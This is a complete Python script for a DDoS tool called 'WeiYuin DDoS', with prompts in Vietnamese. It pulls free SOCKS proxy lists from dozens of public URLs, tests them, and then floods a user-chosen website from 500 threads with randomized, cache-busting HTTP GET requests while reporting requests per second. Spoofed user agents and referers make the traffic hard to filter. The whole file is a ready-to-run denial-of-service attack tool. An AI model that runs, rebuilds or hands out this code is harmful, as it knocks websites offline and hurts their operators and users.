#!/usr/bin/python3
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
from colorama import Fore, Style
from pystyle import Colors, Colorate
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)


class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[0;33m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    LITBU = '\033[94m'
    YELLOW = '\033[3;33m'
    CYAN = '\033[0;36m'
    colors = ['\033[92m', '\033[91m', '\033[0;33m']
    RAND = random.choice(colors)

def logo():
    print(Colorate.Diagonal(Colors.red_to_white
   , "WELCOME TO WeiYuin DDoS"))
    print("")
    banner = '''                                                                                 
▀████▀     █     ▀███ ▀███▀▀▀███  ▀████▀   ▀███▀   ▀██ ▀███▀   ▀██  ▀████▀ ███▄   ▀███▀
  ▀██     ▄██     ▄█    ██    ▀█    ██       ███   ▄█   ██       █    ██    ███▄    █  
   ██▄   ▄███▄   ▄█     ██   █      ██        ███ ▄█    ██       █    ██    █ ███   █  
    ██▄  █▀ ██▄  █▀     ██████      ██         ████     ██       █    ██    █  ▀██▄ █  
    ▀██ █▀  ▀██ █▀      ██   █  ▄   ██          ██      ██       █    ██    █   ▀██▄█  
     ▄██▄    ▄██▄       ██     ▄█   ██          ██      ██▄     ▄█    ██    █     ███  
      ██      ██      ▄██████████ ▄████▄      ▄████▄     ▀██████▀▀  ▄████▄  █      ██  
                                                                                 
                                                                                 
Make By NGUYỄN CÔNG TÙNG 
⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.red_to_white, banner))
    print(Colorate.Diagonal(Colors.red_to_white,"[!] Nghiêm cấm tấn công các trang web chính phủ (.edu, .gov)"))
    print(Colorate.Diagonal(Colors.red_to_white,"|| 微信 (Wechat ID): weiyuin_vn ||"))

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
]
ind_dict = {}
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
###################################################
Intn = random.randint
Choice = random.choice
###################################################
def build_threads(mode,thread_num,event,socks_type,ind_rlock):
	for _ in range(thread_num):
			th = threading.Thread(target = cc,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()

def getuseragent():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomurl():
	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))

def GenReqHeader(method):
	global data
	header = ""
	if method == "get" or method == "head":
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		accept = Choice(acceptall)
		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
		useragent = "User-Agent: " + getuseragent() + "\r\n"
		header =  referer + useragent + accept + connection + "\r\n"
	return header

def ParseUrl(original_url):
	global target
	global path
	global port
	global protocol
	original_url = original_url.strip()
	url = ""
	path = "/"
	port = 80 
	protocol = "http"
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	tmp = url.split("/")
	website = tmp[0]
	check = website.split(":")
	if len(check) != 1:
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)

def InputOption(question,options,default):
	ans = ""
	while ans == "":
		ans = str(input(question)).strip().lower()
		if ans == "":
			ans = default
		elif ans not in options:
			print("> Vui lòng lựa chọn đúng!")
			ans = ""
			continue
	return ans

def CheckerOption():
    global proxies
    N = input(Colorate.Diagonal(Colors.red_to_white, "> Bạn có cần tải xuống danh sách proxy không (y/n, mặc định = y): "))
    if N == 'y' or N == "":
        downloadsocks(choice)
    else:
        pass

    # Đường dẫn tệp proxy
    if choice == "4":
        out_file = input(Colorate.Diagonal(Colors.red_to_white, "> Nhập đường dẫn đến tệp socks4.txt: "))
        if out_file == '':
            out_file = "socks4.txt"
        check_list(out_file)
    elif choice == "5":
        out_file = input(Colorate.Diagonal(Colors.red_to_white, "> Nhập đường dẫn đến tệp socks5.txt: "))
        if out_file == '':
            out_file = "socks5.txt"
        check_list(out_file)
    else:
        print("> Chỉ hỗ trợ socks4 hoặc socks5!")
        sys.exit(1)

    # Đọc và làm sạch danh sách proxy
    with open(out_file, "r") as f:
        raw_proxies = f.readlines()
    
    proxies = []
    for line in raw_proxies:
        # Làm sạch tiền tố
        if line.startswith("socks4://"):
            proxies.append(line.replace("socks4://", "").strip())
        elif line.startswith("socks5://"):
            proxies.append(line.replace("socks5://", "").strip())
        else:
            proxies.append(line.strip())

    # Kiểm tra nếu danh sách proxy trống
    if len(proxies) == 0:
        print("> Danh sách proxy trống, xin hãy tải lại!")
        sys.exit(1)

    # Lưu danh sách proxy đã làm sạch vào tệp
    with open(out_file, "w") as f:
        f.write("\n".join(proxies) + "\n")

    # Hiển thị số lượng proxy
    print(Colorate.Diagonal(Colors.red_to_white, f"> Số Proxy Socks{choice} : {len(proxies)}"))
    time.sleep(0.03)

    # Tùy chọn kiểm tra proxy
    ans = input(Colorate.Diagonal(Colors.red_to_white, "> Bạn có cần kiểm tra danh sách proxy không (y/n, mặc định = y): "))
    if ans == "":
        ans = "y"
    if ans == "y":
        ms = input(Colorate.Diagonal(Colors.red_to_white, "> Nghỉ mỗi socks (giây, mặc định = 5): "))
        if ms == "":
            ms = int(5)
        else:
            try:
                ms = int(ms)
            except:
                ms = float(ms)
        check_socks(ms)

def SetupIndDict():
	global ind_dict
	for proxy in proxies:
		ind_dict[proxy.strip()] = 0

def OutputToScreen(ind_rlock):
	global ind_dict
	i = 0
	sp_char = ["|","/","-","\\"]
	while 1:
		if i > 3:
			i = 0
		# print("{:^70}".format("Trạng thái tấn công"))
		# print("{:^70}".format("IP:PORT   <->   RPS    "))
		ind_rlock.acquire()
		# top_num = 0
		# top10= sorted(ind_dict, key=ind_dict.get, reverse=True)
		# if len(top10) > 10:
		# 	top_num = 10
		# else:
		# 	top_num = len(top10)
		# for num in range(top_num):
		# 	top = "none"
		# 	rps = 0
		# 	if len(ind_dict) != 0:
		# 		top = top10[num]
		# 		rps = ind_dict[top]
		# 		ind_dict[top] = 0
		# 	#print("{:^70}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
		total = 0
		for k,v in ind_dict.items():
			total = total + v
			ind_dict[k] = 0
		ind_rlock.release()
		print("["+sp_char[i]+"]Đang DDoS: "+ Fore.LIGHTYELLOW_EX+url+Style.RESET_ALL+Fore.LIGHTWHITE_EX+"	|| Tổng Rps:"+str(total))
		print(Fore.LIGHTYELLOW_EX+"||Check-host: https://check-host.net/check-http?host="+url+Style.RESET_ALL)
		i+=1
		time.sleep(100)
		print("\n"*1)

def cc(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = get_host + header
					sent = s.send(str.encode(request))
					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:
			s.close()
socket_list=[]
nums = 0
def checking(lines,socks_type,ms,rlock,):
	global nums
	global proxies
	proxy = lines.strip().split(":")
	if len(proxy) != 2:
		rlock.acquire()
		proxies.remove(lines)
		rlock.release()
		return
	err = 0
	while True:
		if err >= 3:
			rlock.acquire()
			proxies.remove(lines)
			rlock.release()
			break
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.settimeout(ms)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms):
	global nums
	thread_list=[]
	rlock = threading.RLock()
	for lines in list(proxies):
		if choice == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
			th.start()
		if choice == "4":
			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write(Fore.YELLOW + "> Đã kiểm tra "+str(nums)+" proxy\r" + Style.RESET_ALL)
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write(Fore.YELLOW + "> Đã kiểm tra "+str(nums)+" proxy\r" + Style.RESET_ALL)
		sys.stdout.flush()
	print(Colorate.Diagonal(Colors.red_to_white,"\r\n> Đã kiểm tra toàn bộ proxy, số proxy hoạt động: ")+str(len(proxies)) + Style.RESET_ALL)
	ans = input(Colorate.Diagonal(Colors.red_to_white,"> Bạn có muốn lưu toàn bộ proxy hoạt động vào một tệp? (y/n, mặc định = y): "))
	if ans == "y" or ans == "":
		if choice == "4":
			with open("socks4.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print(Fore.LIGHTGREEN_EX +"!!! Tệp socks4 live đã được lưu thành socks4.txt."+ Style.RESET_ALL)
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print(Fore.LIGHTGREEN_EX +"!!! Tệp socks5 live đã được lưu thành socks5.txt."+ Style.RESET_ALL)
			
def check_list(socks_file):
	print("> Kiểm tra danh sách")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i:
				temp_list.append(i)
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def downloadsocks(choice):
    urls_socks4 = [
		"https://raw.githubusercontent.com/r00tee/Proxy-List/refs/heads/main/Socks4.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
        "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://www.proxy-list.download/api/v1/get?type=socks4",
        "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
        #"https://api.openproxylist.xyz/socks4.txt",
		"https://raw.githubusercontent.com/SevenworksDev/proxy-list/refs/heads/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks4/socks4.txt",
        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/refs/heads/main/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies_anonymous/socks4.txt",
        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/socks4.txt",
		"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/socks4.txt",
		"https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/socks4.txt"
    ]
    
    urls_socks5 = [
        "https://raw.githubusercontent.com/hookzof/socks5_list/refs/heads/master/proxy.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/socks5.txt",
        "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/refs/heads/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks5/socks5.txt",
    	"https://raw.githubusercontent.com/SevenworksDev/proxy-list/refs/heads/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/im-razvan/proxy_list/refs/heads/main/socks5.txt",
		"https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/refs/heads/main/socks5_checked.txt",
		"https://raw.githubusercontent.com/r00tee/Proxy-List/refs/heads/main/Socks5.txt",
		"https://raw.githubusercontent.com/roosterkid/openproxylist/refs/heads/main/SOCKS5_RAW.txt",
		"https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/socks5.txt",
		"https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies_anonymous/socks5.txt"
		"https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt",
    ]
    if choice == "4":
        filename = "socks4.txt"
        urls = urls_socks4
    elif choice == "5":
        filename = "socks5.txt"
        urls = urls_socks5
    else:
        print("Chỉ hỗ trợ socks4 hoặc socks5.")
        return

    with open(filename, "wb") as f:
        for url in urls:
            try:
                r = requests.get(url)
                f.write(r.content)
            except:
                pass
    print(Fore.GREEN + f"[!] Đã tải xuống danh sách proxy {choice} và lưu thành {filename} !" + Style.RESET_ALL)
def main():
	global multiple
	global choice
	global data
	global cookies
	global brute
	global url
	logo()
	mode = "cc"
	url = input(Colorate.Diagonal(Colors.red_to_white, "> Nhập link tới trang mục tiêu: ")).strip()
	ParseUrl(url)
	choice = InputOption(Colorate.Diagonal(Colors.red_to_white, "> Chọn loại proxy socks (4/5, mặc định = 5): "),["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	thread_num = int(500)
	CheckerOption()
	if len(proxies) == 0:
		print("> Danh sách proxy trống, xin hãy tải lại!")
		return
	ind_rlock = threading.RLock()
	multiple = str(input(Colorate.Diagonal(Colors.red_to_white,"> Giá trị phóng đại lưu lượng (mặc định = 100): ")))
	if multiple == "":
		multiple = int(100)
	else:
		multiple = int(multiple)
	brute = True
	event = threading.Event()
	print(Colorate.Diagonal(Colors.red_to_white,"> Thiết lập kết nối..."))
	SetupIndDict()
	build_threads(mode,thread_num,event,socks_type,ind_rlock)
	event.clear()
	input(Colorate.Diagonal(Colors.red_to_white, "[!] Nhấn Enter để tiếp tục." + Style.RESET_ALL))
	event.set()
	threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
	while True:
		try:
			time.sleep(0.1)
		except KeyboardInterrupt:
			break

if __name__ == "__main__":
	main()